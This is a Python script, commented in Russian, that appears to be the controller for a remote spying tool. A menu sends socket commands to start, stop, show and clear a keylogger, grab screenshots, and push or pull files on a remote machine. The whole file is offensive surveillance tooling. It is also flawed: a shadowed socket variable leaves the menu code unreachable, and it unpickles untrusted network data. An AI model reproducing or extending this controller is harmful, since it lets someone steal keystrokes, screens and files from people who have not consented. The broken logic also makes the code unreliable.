import socket
import struct
import pickle
import os
import time

# Глобальная переменная для сокета
client_socket = None

# Функция для отправки команды на сервер
def send_command(command):
    global client_socket
    try:
        if command not in ['screenshot', 'send_file', 'get_file']:
            client_socket.sendall(command.encode('utf-8'))
            print(f"Sent command: {command}")

        if command == "screenshot":
            client_socket.sendall(command.encode('utf-8'))
            print(f"Sent command: {command}")
            payload_size = struct.calcsize(">Q")
            data = b""
            while len(data) < payload_size:
                data += client_socket.recv(1024)
            packed_image_size = data[:payload_size]
            image_size = struct.unpack(">Q", packed_image_size)[0]
            data = data[payload_size:]
            while len(data) < image_size:
                data += client_socket.recv(1024)
            frame_data = data[:image_size]
            image = pickle.loads(frame_data)  # Десериализация изображения
            # Сохранение изображения
            image.save("screenshot.png")
            print("Screenshot saved as screenshot.png")

        elif command == 'send_file':
            file_path = input("Enter the path of the file to send: ")
            if os.path.exists(file_path):
                file_name = os.path.basename(file_path)
                file_size = os.path.getsize(file_path)

                client_socket.sendall("receive_file:{}".format(file_name).encode('utf-8'))  # Отправляем команду с именем файла
                print("Sent command: {}".format(command))

                response = client_socket.recv(1024)

                if response == b"READY_TO_RECEIVE":
                    # Отправляем размер файла
                    client_socket.sendall(struct.pack(">Q", file_size))
                    print("Sending file '{}' of size {} bytes...".format(file_name, file_size))

                    # Отправляем содержимое файла
                    with open(file_path, "rb") as f:
                        while True:
                            bytes_read = f.read(1024)
                            if not bytes_read:
                                break
                            client_socket.sendall(bytes_read)

                    response = client_socket.recv(1024)
                    print("File '{}' successfully sent.".format(file_name))
                else:
                    print("Server is not ready to receive the file.")
            else:
                print("File not found.")

        elif command == 'get_file':
            client_socket.sendall(command.encode('utf-8'))
            print("Sent command: {}".format(command))
            # Определяем путь для сохранения файлов в папке "files" в текущей директории
            save_path = os.path.join(os.getcwd(), "files")
            # Создаем директорию, если она не существует
            if not os.path.exists(save_path):
                os.makedirs(save_path)
            # Получаем список файлов от сервера
            files_list = client_socket.recv(1024).decode('utf-8')
            print("Available files on server:\n" + files_list)
            # Выбираем файл для загрузки
            file_name = input("Enter the name of the file you want to receive: ")
            client_socket.sendall(file_name.encode('utf-8'))
            # Проверяем, готов ли сервер отправить файл
            response = client_socket.recv(1024)
            if response == b"READY_TO_SEND":
                # Получаем размер файла
                packed_file_size = client_socket.recv(8)
                file_size = struct.unpack(">Q", packed_file_size)[0]
                print("Receiving file '{}' of size {} bytes...".format(file_name, file_size))
                # Получаем и сохраняем файл
                received_size = 0
                file_path = os.path.join(save_path, file_name)  # Сохраняем в папку "files"
                with open(file_path, "wb") as f:
                    while received_size < file_size:
                        data = client_socket.recv(1024)
                        if not data:
                            break
                        f.write(data)
                        received_size += len(data)
                print("File '{}' successfully received and saved in '{}'.".format(file_name, file_path))
            else:
                print("File not found on server.")
    except Exception as e:
        print("An error occurred: {}".format(e))


# Основное меню клиента
# Основное меню клиента
def client_menu():
    while True:
        print("\n1. Start keylogger")
        print("2. Stop keylogger")
        print("3. Show logs")
        print("4. Clear logs")
        print("5. Take screenshot")
        print("6. Send File")
        print("7. Get File")
        print("8. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            send_command("keylogger_start")
            print("Keylogger started.")
        elif choice == '2':
            send_command("keylogger_stop")
            logs = client_socket.recv(1024).decode('utf-8')
            print("Keylogger stopped.")
        elif choice == '3':
            send_command("keylogger_show")
            logs = client_socket.recv(1024).decode('utf-8')
            print("Logs from server:\n" + logs)
        elif choice == '4':
            send_command("keylogger_clear")
            logs = client_socket.recv(1024).decode('utf-8')
            print("Logs cleared.")
        elif choice == '5':
            send_command("screenshot")
        elif choice == '6':
            send_command("send_file")
        elif choice == '7':
            send_command("get_file")
        elif choice == '8':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")


def start_client():
    # Create a socket and connect to the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        # Connect to the server listening on port 8080
        server_address = ('0.0.0.0', 8080)  # Change to your target server if needed
        client_socket.connect(server_address)

        # Receive the server's IP address
        server_ip = client_socket.recv(1024).decode('utf-8').split(':')[1]
        print(f"Received server IP: {server_ip}")

        # Now you can implement further logic using the server_ip
        # For example, sending commands to the server
        while True:
            command = input("Enter command: ")  # Get command from user
            client_socket.sendall(command.encode('utf-8'))

            # Handle server responses
            response = client_socket.recv(1024).decode('utf-8')
            print(f"Server response: {response}")

if __name__ == "__main__":
    try:
        start_client()
    except Exception as e:
        print(f"An error occurred: {e}")
